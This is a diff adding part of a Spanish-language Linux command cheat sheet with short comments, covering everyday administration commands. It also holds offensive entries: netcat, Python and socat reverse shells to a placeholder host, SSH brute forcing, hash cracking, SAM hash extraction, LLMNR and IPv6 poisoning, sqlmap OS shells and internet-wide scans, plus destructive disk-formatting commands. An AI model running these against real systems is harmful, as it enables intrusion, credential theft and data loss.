+iptables -A INPUT -p tcp --dport 22 -j ACCEPT    # Permitir SSH
+iptables -F    # Vaciar reglas
+iptables -L    # Listar reglas de firewall
+iptables -t nat -L    # Listar reglas NAT
+iptables-restore    # Restaurar reglas
+iptables-save    # Guardar reglas
+iw dev    # Mostrar dispositivos wireless
+iwconfig    # Mostrar configuración wireless (legacy)
+Ctrl-I    # Tabulación (completar)
+jobs    # Listar trabajos en segundo plano
+jobs -l    # Listar trabajos con PIDs
+john --show hash.txt    # Mostrar hashes crackeados
+john --wordlist=pass.txt hash.txt    # Crack de hashes
+join archivo1 archivo2    # Unir archivos por campo común
+jot 100    # Generar secuencia (BSD)
+journalctl    # Mostrar logs del sistema
+journalctl --since "1 hour ago"    # Logs desde hace 1 hora
+journalctl -f    # Seguir logs en tiempo real
+journalctl -u servicio    # Mostrar logs de un servicio
+journalctl -xe    # Mostrar logs con contexto extendido
+jpegoptim imagen.jpg    # Optimizar JPEG
+Ctrl-J    # Aceptar línea
+kcachegrind callgrind.out    # Visualizar callgrind
+kdialog --msgbox "Hola"    # Diálogo KDE desde script
+keepass2john archivo.kdbx > hash.txt    # Preparar KeePass
+kerbrute userenum -d domain --dc host wordlist.txt    # Enumerar usuarios Kerberos
+kill -9 PID    # Enviar SIGKILL a proceso
+kill -HUP PID    # Enviar SIGHUP (recargar configuración)
+kill PID    # Enviar SIGTERM a proceso
+killall -9 nombre    # Forzar matar todos los procesos
+killall nombre    # Matar todos los procesos por nombre
+kubectl apply -f archivo.yaml    # Aplicar manifest
+kubectl cluster-info    # Información del cluster
+kubectl config get-contexts    # Listar contexts
+kubectl config use-context contexto    # Cambiar contexto
+kubectl delete -f archivo.yaml    # Eliminar manifest
+kubectl describe pod nombre    # Describir pod
+kubectl exec -it pod -- bash    # Ejecutar en pod
+kubectl get nodes    # Listar nodos
+kubectl get pods    # Listar pods
+kubectl get services    # Listar servicios
+kubectl logs pod    # Ver logs de pod
+kubectl port-forward pod 8080:80    # Redirigir puerto
+kubectl top pods    # Uso de recursos de pods
+Ctrl-K    # Borrar desde cursor al final
+last    # Mostrar historial de logins
+lastb    # Mostrar intentos de login fallidos
+lastlog    # Último login de todos los usuarios
+ldapsearch -x -h host -b "dc=domain,dc=com"    # Consulta LDAP
+ldapsearch -x -h host -D "cn=admin" -w pass    # Autenticada
+ldconfig    # Actualizar caché de bibliotecas
+ldconfig -p    # Mostrar bibliotecas en caché
+ldd binario    # Listar bibliotecas compartidas
+less +F archivo    # Seguir archivo como tail -f dentro de less
+less archivo    # Paginar contenido bidireccional
+ln -s origen destino    # Crear enlace simbólico
+ln -sf origen destino    # Forzar enlace simbólico
+ln origen destino    # Crear enlace duro
+locale-gen    # Generar locales
+locate archivo    # Buscar archivo en base de datos
+logger -t tag mensaje    # Escribir con tag específico
+logger mensaje    # Escribir en syslog
+logname    # Mostrar login name
+logout    # Cerrar sesión
+logrotate -f /etc/logrotate.conf    # Forzar rotación de logs
+lolcat    # Arcoíris en texto
+ls    # Listar archivos
+ls --color=auto    # Listar con colores automáticos
+ls -1    # Listar un archivo por línea
+ls -d */    # Listar solo directorios
+ls -i    # Listar con números de inodo
+ls -l    # Listar en formato largo
+ls -la    # Listar todos incluyendo ocultos
+ls -lah    # Listar todos con tamaños humanos
+ls -lF    # Listar con tipo indicado por sufijo
+ls -lhS    # Listar ordenado por tamaño descendente
+ls -ltr    # Listar ordenado por tiempo invertido
+ls -R    # Listar recursivamente
+lsb_release -a    # Información de distribución
+lsblk    # Listar bloques y montajes
+lsblk -a    # Listar dispositivos vacíos también
+lsblk -f    # Listar con filesystems
+lsblk -o NAME,SIZE,FSTYPE,MOUNTPOINT,UUID    # Columnas específicas
+lscpu    # Información de CPU
+lscpu -e    # Información extendida de CPU
+lsmod    # Listar módulos cargados
+lsof    # Listar archivos abiertos
+lsof +D dir    # Listar archivos abiertos en directorio
+lsof +f -- /mnt    # Listar archivos abiertos en punto de montaje
+lsof -i :80    # Listar procesos usando puerto 80
+lsof -i TCP:80    # Procesos en puerto TCP 80
+lsof -p PID    # Archivos abiertos por proceso
+lsof -u user    # Listar archivos abiertos por usuario
+lsof archivo    # Listar procesos usando archivo
+lspci    # Listar dispositivos PCI
+lspci -k    # Mostrar drivers de PCI
+lspci -v    # Listar PCI verbose
+lsusb    # Listar dispositivos USB
+lsusb -v    # Listar USB verbose
+ltrace -p PID    # Trazar llamadas a bibliotecas
+ltrace -S comando    # Trazar syscalls también
+ltrace comando    # Trazar llamadas a bibliotecas
+lvcreate -L 10G -n lv0 vg0    # Crear volumen lógico
+lvextend -L +5G /dev/vg0/lv0    # Extender volumen lógico
+lvremove /dev/vg0/lv0    # Eliminar volumen lógico
+Ctrl-L    # Limpiar pantalla
+mailq    # Ver cola de correo
+make    # Compilar proyecto
+make -j$(nproc)    # Compilar en paralelo
+make clean    # Limpiar compilación
+make install    # Instalar proyecto compilado
+makepkg -si    # Construir e instalar desde PKGBUILD
+man -k palabra    # Buscar en páginas de manual
+man comando    # Mostrar manual de comando
+mandb    # Actualizar base de man pages
+masscan 0.0.0.0/0 -p0-65535 --rate 100000    # Scan masivo rápido
+mawk '{print $1}' archivo    # Variante ligera de awk
+md5sum -c checksums.md5    # Verificar hashes
+md5sum archivo    # Hash MD5
+medusa -h host -u admin -P pass.txt -M ssh    # Fuerza bruta SSH
+mesg n    # Deshabilitar mensajes de otros
+mesg y    # Habilitar mensajes
+mitm6 -d domain    # Envenenamiento IPv6
+mkdir -m 755 dir    # Crear con permisos específicos
+mkdir -p dir/subdir    # Crear directorios intermedios si no existen
+mkdir dir    # Crear directorio
+mkfs.ext4 /dev/mapper/secure    # Formatear volumen desencriptado
+mkfs.ext4 /dev/sda1    # Formatear como ext4
+mkfs.vfat /dev/sda1    # Formatear como FAT32
+mkfs.xfs /dev/sda1    # Formatear como XFS
+mkinitramfs -o /boot/initrd    # Crear initramfs
+mkswap /dev/sda2    # Crear swap
+modinfo modulo    # Información de módulo
+modprobe -r modulo    # Descargar módulo
+modprobe modulo    # Cargar módulo del kernel
+mogrify -resize 50% *.jpg    # Redimensionar múltiples imágenes
+more archivo    # Paginar contenido hacia adelante
+mount --bind /origen /destino    # Montaje bind
+mount -o remount,rw /    # Remontar raíz como lectura/escritura
+mount /dev/sda1 /mnt    # Montar partición
+mount | grep sda1    # Ver punto de montaje
+mpg123 archivo.mp3    # Reproducir MP3
+mpstat -P ALL 1    # Mostrar estadísticas de CPU por núcleo
+mtr host    # Combinación de ping y traceroute
+mv -i origen destino    # Mover con confirmación
+mv origen destino    # Mover o renombrar
+Ctrl-M    # Aceptar línea (Enter)
+nano -w archivo    # Editar sin wrap
+nano archivo    # Editar con Nano
+nc -e /bin/bash host puerto    # Reverse shell básica
+nc -l -p puerto    # Escuchar en puerto
+nc -lk -p puerto    # Escuchar persistentemente
+nc -lvnp puerto    # Listener netcat
+nc -zv host rango_puertos    # Escanear puertos
+nc -zvw3 host 1-100    # Escaneo rápido de puertos
+nc host puerto    # Conectar a puerto con netcat
+ncat -lvnp puerto --ssl    # Listener con SSL
+neo4j console    # Iniciar Neo4j para BloodHound
+netcat -zv host 1-1000    # Escaneo básico de puertos con netcat
+netstat -an    # Mostrar todas las conexiones
+netstat -rn    # Mostrar tabla de rutas
+netstat -tulpn    # Mostrar puertos en escucha con PID
+newaliases    # Reconstruir base de datos de aliases
+ngrep -d eth0 palabra    # Grep para tráfico de red
+nice -n -10 comando    # Ejecutar con mayor prioridad
+nice -n 10 comando    # Ejecutar con menor prioridad
+nikto -h http://host    # Escaneo de vulnerabilidades web
+nl -ba archivo    # Numerar todas incluyendo vacías
+nl archivo    # Mostrar con números de línea lógicos
+nm -C binario    # Símbolos demangled
+nm binario    # Listar símbolos
+nmap --script vuln host    # Escaneo de vulnerabilidades
+nmap --traceroute host    # Traceroute con nmap
+nmap -A -T4 host    # Escaneo agresivo rápido
+nmap -A host    # Escaneo agresivo
+nmap -D RND:10 host    # Decoy scan
+nmap -f host    # Fragmentar paquetes
+nmap -O host    # Detectar sistema operativo
+nmap -p 1-65535 host    # Escanear todos los puertos
+nmap -Pn host    # No hacer ping previo
+nmap -sn 192.168.1.0/24    # Descubrir hosts en red
+nmap -sS -p- host    # SYN scan todos los puertos
+nmap -sU -p 53,161 host    # UDP scan
+nmap -sV -O host    # Detección de servicios y SO
+nmap -sV host    # Detectar versiones de servicios
+nmap host    # Escanear host
+nmblookup -A host    # NetBIOS lookup
+node -e "console.log('hola')"    # Ejecutar código inline
+node script.js    # Ejecutar script Node
+nohup comando &    # Ejecutar comando inmune a hangups
+nohup comando > salida.log 2>&1 &    # Ejecutar en background persistente
+notify-send "Título" "Mensaje"    # Notificación de escritorio
+npm install -g paquete    # Instalar globalmente
+npm install paquete    # Instalar paquete Node
+npm list    # Listar instalados
+npm run script    # Ejecutar script
+npm uninstall paquete    # Desinstalar
+npm update    # Actualizar
+npx paquete    # Ejecutar paquete sin instalar
+nslookup dominio    # Consultar DNS (legacy)
+ntpdate servidor    # Sincronizar hora NTP
+nvim archivo    # Neovim
+nyancat    # Nyan cat en terminal
+Ctrl-N    # Comando siguiente en historial
+objcopy --strip-debug binario binario.stripped    # Strip debug symbols
+objdump -d binario    # Desensamblar binario
+objdump -dS binario    # Desensamblar con código fuente
+objdump -h binario    # Mostrar secciones
+od -A x -t x1z archivo    # Volcar en hexadecimal
+od -c archivo    # Volcar en caracteres
+ogg123 archivo.ogg    # Reproducir Ogg
+openssl base64 -d -in archivo.b64 -out archivo    # Decodificar Base64
+openssl base64 -in archivo -out archivo.b64    # Codificar Base64
+openssl enc -aes-256-cbc -d -in archivo.enc -out archivo    # Desencriptar
+openssl enc -aes-256-cbc -salt -in archivo -out archivo.enc    # Encriptar con OpenSSL
+openssl genrsa -out key.pem 2048    # Generar clave privada RSA
+openssl req -new -key key.pem -out csr.pem    # Generar CSR
+openssl s_client -connect host:443    # Verificar conexión SSL
+openssl s_server -cert cert.pem -key key.pem -accept 4433    # Servidor SSL de prueba
+openssl x509 -in cert.pem -text    # Mostrar contenido de certificado
+optipng imagen.png    # Optimizar PNG
+outguess -k pass -r imagen.jpg salida.txt    # Extraer esteganografía
+Ctrl-O    # Ejecutar y mostrar siguiente del historial
+pacman -Ql paquete    # Listar archivos
+pacman -Qo archivo    # Buscar dueño de archivo
+pacman -Qs palabra    # Buscar en instalados
+pacman -R paquete    # Eliminar paquete
+pacman -Rns paquete    # Eliminar con dependencias huérfanas
+pacman -S paquete    # Instalar paquete (Arch)
+pacman -Sc    # Limpiar caché
+pacman -Scc    # Limpiar caché completamente
+pacman -Si paquete    # Información
+pacman -Ss palabra    # Buscar paquete
+pacman -Syu    # Actualizar sistema
+pamac install paquete    # Instalar (Manjaro)
+paplay archivo.wav    # Reproducir con PulseAudio
+parted -l    # Listar dispositivos y particiones
+parted /dev/sda print    # Mostrar tabla de particiones
+partprobe    # Releer tabla de particiones
+passwd    # Cambiar contraseña
+passwd user    # Cambiar contraseña de usuario
+paste -d',' archivo1 archivo2    # Fusionar con separador
+paste archivo1 archivo2    # Fusionar líneas paralelas
+patator ssh_login host=host user=admin password=FILE0 0=pass.txt    # Patator
+patch -p1 < diff.patch    # Aplicar parche quitando prefijo
+patch -R < diff.patch    # Revertir parche
+patch < diff.patch    # Aplicar parche
+patchelf --set-rpath '/lib' binario    # Cambiar rpath
+pdf2john archivo.pdf > hash.txt    # Preparar PDF para John
+pdfinfo archivo.pdf    # Información de PDF
+pdftk A=archivo.pdf cat A1-5 output salida.pdf    # Manipular PDF
+pdftoppm archivo.pdf prefijo    # Convertir PDF a imágenes
+pdftotext archivo.pdf    # Extraer texto de PDF
+perf record -g -a sleep 10    # Grabar 10 segundos de perfil del sistema
+perf record -g comando    # Grabar perfil con call graph
+perf report    # Mostrar reporte de perfil
+perf stat -d comando    # Estadísticas detalladas
+perf stat comando    # Estadísticas de rendimiento
+perf top    # Top de funciones en CPU
+perf top -g    # Top de funciones con call graph
+perl script.pl    # Ejecutar Perl
+pgrep nombre    # Buscar PID por nombre
+php -S localhost:8000    # Servidor PHP de desarrollo
+php script.php    # Ejecutar PHP
+pico archivo    # Editar con Pico (variante Nano)
+pidstat 1    # Mostrar estadísticas por proceso
+ping -c 4 host    # Enviar 4 paquetes ICMP
+ping -i 0.2 host    # Intervalo de 0.2 segundos
+ping host    # Probar conectividad ICMP
+ping6 host    # Ping IPv6
+pip freeze    # Listar para requirements.txt
+pip install --upgrade pip    # Actualizar pip
+pip install -r requirements.txt    # Instalar desde archivo
+pip install paquete    # Instalar paquete Python
+pip list    # Listar paquetes Python
+pip uninstall paquete    # Desinstalar paquete Python
+pkill -f patron    # Matar procesos que coincidan con patrón
+pkill nombre    # Matar procesos por nombre
+popd    # Sacar directorio de la pila y cambiar a él
+postcat -q ID    # Ver contenido de mensaje en cola
+postqueue -p    # Ver cola de Postfix
+postsuper -d ALL    # Vaciar cola de Postfix
+poweroff    # Apagar sistema
+pr -2 archivo    # Dos columnas
+pr archivo    # Formatear para impresión
+prelink -a    # Prelink bibliotecas
+printenv    # Imprimir variables de entorno
+printenv HOME    # Imprimir variable específica
+printf "%s\n" "$VAR"    # Imprimir variable seguro
+printf "formato" args    # Imprimir con formato
+ps    # Mostrar procesos actuales
+ps -ef    # Mostrar todos los procesos en formato estándar
+ps -u user    # Mostrar procesos de usuario
+ps aux    # Mostrar todos los procesos detallados
+ps aux | grep -v grep | grep nginx    # Buscar nginx excluyendo grep
+ps aux | grep nginx    # Buscar proceso nginx
+ps aux | grep X    # Buscar procesos por nombre
+ps auxf    # Mostrar procesos en formato árbol
+pushd dir    # Apilar directorio y cambiar a él
+pv    # Pipe viewer: monitor de progreso en pipelines
+pvcreate /dev/sdb    # Crear volumen físico LVM
+pvremove /dev/sdb    # Eliminar volumen físico
+pwd    # Imprimir directorio actual
+pwd -P    # Imprimir ruta física sin symlinks
+pwntools template --host host --port 1337 > exploit.py    # Template exploit
+python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("host",puerto));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'    # Reverse Python
+python -m http.server 8000    # Servidor web simple
+python -m venv env    # Crear entorno virtual
+python script.py    # Ejecutar script Python
+python3 -c "import pty; pty.spawn('/bin/bash')"    # Mejorar shell
+python3 script.py    # Ejecutar con Python 3
+Ctrl-P    # Comando anterior en historial
+qpdf --encrypt pass pass 128 -- archivo.pdf salida.pdf    # Encriptar PDF
+Ctrl-Q    # Reanudar salida en terminal
+rar a archivo.rar archivos    # Crear rar
+readelf -a binario    # Información ELF completa
+readelf -h binario    # Header ELF
+readelf -l binario    # Header de programa
+readelf -S binario    # Tabla de secciones
+reboot    # Reiniciar sistema
+renice 10 PID    # Cambiar prioridad de proceso en ejecución
+reset    # Reiniciar terminal
+resize2fs /dev/vg0/lv0    # Redimensionar filesystem ext
+Responder -I eth0    # Envenenamiento NetBIOS/LLMNR
+rev    # Reversar texto
+rev archivo    # Reversar caracteres de cada línea
+rg patron    # ripgrep: buscar rápidamente
+rm -f archivo    # Eliminar forzosamente
+rm -i archivo    # Eliminar con confirmación
+rm -r dir    # Eliminar directorio recursivamente
+rm -rf /var/lib/apt/lists/*    # Limpiar caché de apt
+rm -rf dir    # Eliminar forzosamente y recursivamente
+rm archivo    # Eliminar archivo
+rmdir dir    # Eliminar directorio vacío
+rmmod modulo    # Eliminar módulo
+route -n    # Mostrar tabla de rutas (legacy)
+rpcclient -U admin host    # Cliente RPC
+rpm -e paquete    # Eliminar RPM
+rpm -i paquete.rpm    # Instalar RPM
+rpm -qa    # Listar todos los RPM instalados
+rpm -qf archivo    # Buscar paquete de archivo
+rpm -qip paquete.rpm    # Información de RPM no instalado
+rpm -ql paquete    # Listar archivos de RPM
+rsync -av origen destino    # Sincronizar archivos preservando atributos
+rsync -avz --delete origen destino    # Sincronizar eliminando extras en destino
+rsync -avz --progress origen destino    # Mostrar progreso
+rsync -avz -e ssh origen user@host:/ruta    # Sincronizar por SSH
+rsync -avz origen destino    # Sincronizar con compresión
+ruby script.rb    # Ejecutar Ruby
+runlevel    # Mostrar nivel de ejecución
+runlevel - prev curr    # Niveles de ejecución
+Ctrl-R    # Buscar en historial (bash/fzf)
+samdump2 SYSTEM SAM    # Extraer hashes SAM Windows
+sar -n DEV 1    # Mostrar estadísticas de red cada segundo
+sar -r 1    # Mostrar uso de memoria cada segundo
+sar -u 1    # Mostrar uso de CPU cada segundo
+scp -P 2222 archivo user@host:/ruta    # Usar puerto específico
+scp -r dir user@host:/ruta    # Copiar directorio por SSH
+scp archivo user@host:/ruta    # Copiar archivo por SSH
+scp user@host:/ruta/archivo .    # Descargar archivo por SSH
+screen    # Iniciar sesión screen
+screen -d -r nombre    # Desconectar y reconectar
+screen -dmS session comando    # Crear sesión screen detached
+screen -ls    # Listar sesiones
+screen -r nombre    # Reconectar a sesión
+screen -S nombre    # Iniciar sesión con nombre
+screen -S session -p 0 -X stuff "comando$(printf \\r)"    # Enviar comando
+screen -X -S nombre quit    # Matar sesión
+script    # Grabar sesión de terminal
+script /dev/null -c "bash"    # Otra forma de obtener TTY
+scriptreplay timing sesión    # Reproducir sesión grabada
+sdiff archivo1 archivo2    # Comparar side-by-side interactivo
+sed '/^$/d' archivo    # Borrar líneas vacías
+sed '/pattern/d' archivo    # Eliminar líneas con patrón
+sed '10,20d' archivo    # Eliminar líneas 10-20
+sed 's/$/suffix/' archivo    # Añadir sufijo a cada línea
+sed 's/^/prefix/' archivo    # Añadir prefijo a cada línea
+sed 's/foo/bar/' archivo    # Reemplazar primera ocurrencia por línea
+sed 's/foo/bar/g' archivo    # Reemplazar todas las ocurrencias
+sed -e 's/a/b/' -e 's/c/d/' archivo    # Múltiples expresiones
+sed -f script.sed archivo    # Leer script de archivo
+sed -i 's/foo/bar/g' archivo    # Reemplazar en archivo (in-place)
+sed -i.bak 's/foo/bar/g' archivo    # Backup antes de reemplazar
+sed -n '10,20p' archivo    # Imprimir líneas 10-20
+sed -r 's/regex/rep/' archivo    # Usar regex extendida
+sendmail -bp    # Ver cola de correo
+seq -f "%04g" 1 100    # Secuencia con formato
+seq 1 100    # Secuencia de 1 a 100
+seq 1 2 100    # Secuencia de 1 a 100 de 2 en 2
+service --status-all    # Listar estado de todos los servicios
+service servicio restart    # Reiniciar servicio (SysV)
+service servicio start    # Iniciar servicio (SysV)
+service servicio stop    # Detener servicio (SysV)
+set    # Mostrar variables y funciones
+set +e    # No salir ante errores
+set +x    # Desactivar modo debug
+set -e    # Salir ante errores
+set -o    # Mostrar opciones
+set -x    # Activar modo debug
+sfdisk -d /dev/sda > partition_table.dmp    # Dumpear tabla de particiones
+sfdisk /dev/sda < partition_table.dmp    # Restaurar tabla de particiones
+sftp user@host    # Shell FTP interactivo sobre SSH
+sh script.sh    # Ejecutar script en sh
+sha1sum archivo    # Hash SHA1
+sha256sum -c checksums.sha256    # Verificar SHA256
+sha256sum archivo    # Hash SHA256
+sha512sum archivo    # Hash SHA512
+shasum -a 256 archivo    # SHA256 (macOS/Perl)
+shopt    # Mostrar opciones de shell
+shopt -s opcion    # Habilitar opción
+shopt -u opcion    # Deshabilitar opción
+shuf -n 10 archivo    # Seleccionar 10 líneas aleatorias
+shuf archivo    # Barajar líneas aleatoriamente
+shutdown -h +5    # Apagar en 5 minutos
+shutdown -h now    # Apagar ahora
+shutdown -r now    # Reiniciar ahora
+size binario    # Tamaños de secciones
+sl    # Tren de vapor (corrección de 'ls')
+sleep 5    # Esperar 5 segundos
+sleep 5h    # Esperar 5 horas
+sleep 5m    # Esperar 5 minutos
+smartctl -a /dev/sda    # Información SMART
+smartctl -t short /dev/sda    # Ejecutar test SMART corto
+smbclient -L //host -U admin    # Listar shares SMB
+smbclient //host/share -U admin    # Conectar a share
+snap install paquete    # Instalar snap
+snap list    # Listar snaps
+snap refresh    # Actualizar snaps
+snap remove paquete    # Eliminar snap
+socat - TCP:host:80    # Conectar como netcat mejorado
+socat -d -d TCP-LISTEN:puerto STDOUT    # Listener avanzado
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:host:port    # Shell con PTY
+socat STDIO TCP4:host:80    # Conectar a puerto
+socat TCP-LISTEN:8080,fork TCP:host:80    # Redirigir puertos
+socat TCP4-LISTEN:1234,fork TCP4:host:80    # Proxy TCP
+sort -h archivo    # Ordenar tamaños humanos
+sort -k2 archivo    # Ordenar por segunda columna
+sort -M archivo    # Ordenar por mes
+sort -n archivo    # Ordenar numéricamente
+sort -r archivo    # Ordenar inversamente
+sort -t',' -k2 archivo    # Ordenar por columna con separador
+sort -u archivo    # Ordenar y eliminar duplicados
+sort archivo    # Ordenar líneas
+source archivo    # Ejecutar archivo en shell actual
+source env/bin/activate    # Activar entorno virtual
+split -b 1M archivo    # Dividir en archivos de 1MB
+split -l 1000 archivo    # Dividir en archivos de 1000 líneas
+sqlmap --os-shell    # Obtener shell mediante SQLi
+sqlmap -r request.txt    # Usar request desde archivo
+sqlmap -u "http://host/page.php?id=1"    # Test de SQL Injection
+sqlmap -u URL --dump    # Dumpear base de datos
+ss -s    # Mostrar resumen de sockets
+ss -tlnp    # Mostrar sockets TCP en escucha con proceso
+ss -tulpn    # Equivalente moderno a netstat -tulpn
+ssh -D 1080 user@host    # Proxy SOCKS
+ssh -i key.pem user@host    # Conectar con clave privada
+ssh -L 8080:localhost:80 user@host    # Túnel local
+ssh -N -f user@host    # Crear túnel en background
+ssh -p 2222 user@host    # Conectar por puerto específico
+ssh -R 8080:localhost:80 user@host    # Túnel remoto
+ssh -t user@host comando    # Ejecutar comando con TTY
+ssh user@host    # Conectar a host por SSH
+ssh user@host "comando"    # Ejecutar comando remoto
+ssh-add    # Añadir clave privada al agente
+ssh-add -l    # Listar claves en el agente
+ssh-agent bash    # Iniciar agente SSH
+ssh-copy-id user@host    # Copiar clave pública a host remoto
+ssh-keygen -t ed25519    # Generar clave Ed25519
+ssh-keygen -t rsa -b 4096    # Generar par de claves RSA
+stat -c "%A %n" archivo    # Formato personalizado
+stat archivo    # Mostrar estadísticas detalladas
+steghide extract -sf imagen.jpg -p pass    # Extraer datos ocultos
+strace -e open comando    # Trazar solo llamadas open
+strace -e trace=open,close,read,write -o salida comando    # Trazar syscalls
+strace -f -e trace=network -s 10000 comando    # Trazar red
+strace -f comando    # Trazar proceso e hijos
+strace -p PID    # Trazar llamadas al sistema de proceso
+strings -n 8 archivo    # Extraer strings de longitud mínima
+strings archivo | grep -i password    # Buscar strings sensibles
+strings binario    # Extraer strings legibles
+strip binario    # Eliminar símbolos de binario
+stty -a    # Mostrar configuración actual
+stty erase ^H    # Configurar tecla de borrado
+stty raw -echo; fg    # Mejorar shell interactiva
+stty sane    # Restaurar configuración de terminal
+su -    # Cambiar a root con entorno completo
+su -c "comando"    # Ejecutar comando como otro usuario
+su user    # Cambiar a usuario
+sudo !!    # Repetir último comando con sudo
+sudo -i    # Iniciar shell como root
+sudo -s    # Iniciar shell con entorno preservado
+sudo -u user comando    # Ejecutar como otro usuario
+sudo checkinstall    # Crear paquete e instalar
+sudo comando    # Ejecutar comando como superusuario
+sudo ldconfig    # Actualizar caché de bibliotecas
+sudo make install    # Instalar compilado
+swapoff /dev/sda2    # Desactivar swap
+swapon /dev/sda2    # Activar swap
+sync    # Sincronizar buffers de escritura
+sysctl -a    # Listar todos los parámetros del kernel
+sysctl -p    # Recargar /etc/sysctl.conf
+sysctl -w kernel.parametro=valor    # Escribir parámetro
+sysctl kernel.parametro    # Mostrar parámetro específico
+systemctl disable servicio    # Deshabilitar servicio al inicio
+systemctl enable servicio    # Habilitar servicio al inicio
+systemctl list-units --type=service    # Listar servicios activos
+systemctl reload servicio    # Recargar configuración de servicio
+systemctl restart servicio    # Reiniciar servicio
+systemctl start servicio    # Iniciar servicio
+systemctl status servicio    # Ver estado de servicio
+systemctl stop servicio    # Detener servicio
+systemd-analyze    # Tiempo de arranque de systemd
+systemd-analyze blame    # Servicios que más tardan en iniciar
+systemd-analyze critical-chain    # Cadena crítica de arranque
+Ctrl-S    # Detener salida en terminal
+tac archivo    # Mostrar contenido en orden inverso
+tail -f archivo    # Seguir archivo en tiempo real
+tail -n 20 archivo    # Mostrar últimas 20 líneas
+tail archivo    # Mostrar últimas 10 líneas
+tar --listed-incremental=snapshot -czvf backup.tar.gz dir    # Backup incremental
+tar -C /destino -xzvf backup.tar.gz    # Extraer en directorio específico
+tar -czvf - dir | gpg -c > backup.tar.gz.gpg    # Backup encriptado
+tar cJf backup.tar.xz dir    # Crear tar.xz
+tar cvf archivo.tar dir    # Crear tar
+tar cvjf archivo.tar.bz2 dir    # Crear tar.bz2
+tar cvzf archivo.tar.gz dir    # Crear tar.gz
+tar czvf - dir | ssh host "cat > archivo.tar.gz"    # Tar por SSH
+tar czvf - dir | ssh host "cat > backup.tar.gz"    # Backup por SSH
+tar czvf backup.tar.gz --exclude='*.tmp' dir    # Excluir patrones
+tar rvf archivo.tar archivo    # Añadir archivo a tar existente
+tar tvf archivo.tar    # Listar contenido de tar
+tar xvf archivo.tar    # Extraer tar
+tar xvjf archivo.tar.bz2    # Extraer tar.bz2
+tar xvzf archivo.tar.gz    # Extraer tar.gz
+tcpdump -c 100 -w capture.pcap    # Guardar 100 paquetes en archivo
+tcpdump -i any port 80    # Capturar tráfico del puerto 80
+tcpdump -i eth0    # Capturar tráfico en interfaz
+tcpflow -i eth0    # Capturar flujos TCP
+tcpick -i eth0 -wR    # Reconstruir sesiones TCP
+tcsh    # Iniciar tcsh
+tee -a archivo.txt    # Append a archivo y stdout
+tee archivo.txt    # Redirigir a archivo y stdout simultáneamente
+telinit 3    # Cambiar a nivel de ejecución 3
+terraform apply    # Aplicar cambios
+terraform destroy    # Destruir infraestructura
+terraform fmt    # Formatear código
+terraform init    # Inicializar Terraform
+terraform plan    # Plan de cambios
+terraform validate    # Validar configuración
+time -v comando    # Medir con detalle
+time comando    # Medir tiempo de ejecución
+timedatectl    # Configuración de fecha/hora
+timedatectl set-ntp true    # Habilitar NTP
+timedatectl set-timezone Zone    # Cambiar zona horaria
+tmux    # Iniciar sesión tmux
+tmux attach -t nombre    # Adjuntar a sesión
+tmux detach    # Desprenderse
+tmux kill-session -t nombre    # Matar sesión
+tmux ls    # Listar sesiones
+tmux new -s nombre    # Nueva sesión con nombre
+tmux new-session -d -s "session" "comando"    # Crear sesión tmux detached
+tmux new-window    # Nueva ventana
+tmux resize-pane -D 10    # Redimensionar panel
+tmux select-window -t 0    # Seleccionar ventana
+tmux send-keys -t nombre "comando" C-m    # Enviar comando a sesión
+tmux send-keys -t session "comando" Enter    # Enviar comando
+tmux split-window    # Dividir ventana horizontal
+tmux split-window -h    # Dividir ventana vertical
+toilet TEXTO    # Arte ASCII grande
+top    # Monitor de procesos interactivo
+touch -t YYYYMMDDHHMM archivo    # Establecer timestamp específico
+touch archivo    # Crear archivo vacío o actualizar timestamp
+tput reset    # Resetear terminal
+traceroute -I host    # Usar ICMP en lugar de UDP
+traceroute host    # Rastrear ruta hacia host
+trap 'echo error' ERR    # Capturar errores
+trap 'echo saliendo' EXIT    # Capturar salida
+tset    # Inicializar terminal
+tshark -i eth0    # Wireshark en modo CLI
+tty    # Mostrar nombre de terminal
+tune2fs -l /dev/sda1    # Mostrar información de ext
+tune2fs -m 0 /dev/sda1    # Reservar 0% para root
+type -a comando    # Mostrar todas las ubicaciones del comando
+type comando    # Indicar tipo de comando
+TZ=America/New_York date    # Fecha en zona horaria específica
+Alt-T    # Transponer palabras
+Ctrl-T    # Transponer caracteres
+ufw allow 22    # Permitir puerto 22
+ufw deny 80    # Denegar puerto 80
+ufw disable    # Deshabilitar UFW
+ufw enable    # Habilitar UFW
+ufw status    # Ver estado de UFW
+ulimit -a    # Mostrar límites de recursos
+ulimit -n 4096    # Aumentar límite de descriptores de archivo
+ulimit -u 1000    # Aumentar límite de procesos
+umask 022    # Establecer máscara de permisos por defecto
+umount /mnt    # Desmontar
+unalias ll    # Eliminar alias
+uname    # Mostrar información del kernel
+uname -a    # Mostrar toda la información del sistema
+uname -m    # Arquitectura de máquina
+uname -r    # Mostrar versión del kernel
+unexpand -t 4 archivo    # Contraer espacios a tabs
+uniq -c archivo    # Contar ocurrencias
+uniq -d archivo    # Mostrar solo duplicados
+uniq -u archivo    # Mostrar solo únicos
+uniq archivo    # Eliminar líneas duplicadas adyacentes
+uniscan -u http://host    # Escaneo web
+units    # Convertir unidades
+units '10 meters' 'feet'    # Conversión específica
+unrar l archivo.rar    # Listar RAR
+unrar x archivo.rar    # Extraer rar
+unset VAR    # Eliminar variable
+unxz archivo.xz    # Descomprimir xz
+unzip -l archivo.zip    # Listar contenido sin extraer
+unzip archivo.zip    # Extraer zip
+update-alternatives --config editor    # Cambiar editor por defecto
+update-grub    # Actualizar configuración de GRUB
+update-initramfs -u    # Actualizar initramfs
+update-locale    # Actualizar locale del sistema
+updatedb    # Actualizar base de datos de locate
+uptime    # Mostrar tiempo encendido y carga
+useradd user    # Crear usuario
+userdel -r user    # Eliminar usuario y su home
+userdel user    # Eliminar usuario
+usermod -aG group user    # Añadir usuario a grupo
+usermod -l newname oldname    # Renombrar usuario
+users    # Mostrar usuarios conectados
+uudecode archivo.uu    # Decodificar uuencode
+uuencode archivo salida    # Codificar uuencode
+Ctrl-U    # Borrar desde cursor al inicio
+vagrant destroy    # Destruir máquina
+vagrant halt    # Detener máquina
+vagrant provision    # Reaprovisionar
+vagrant ssh    # Conectar por SSH
+vagrant status    # Ver estado
+vagrant up    # Levantar máquina Vagrant
+valgrind --leak-check=full ./programa    # Detectar fugas de memoria
+valgrind --tool=callgrind ./binario    # Perfil de llamadas
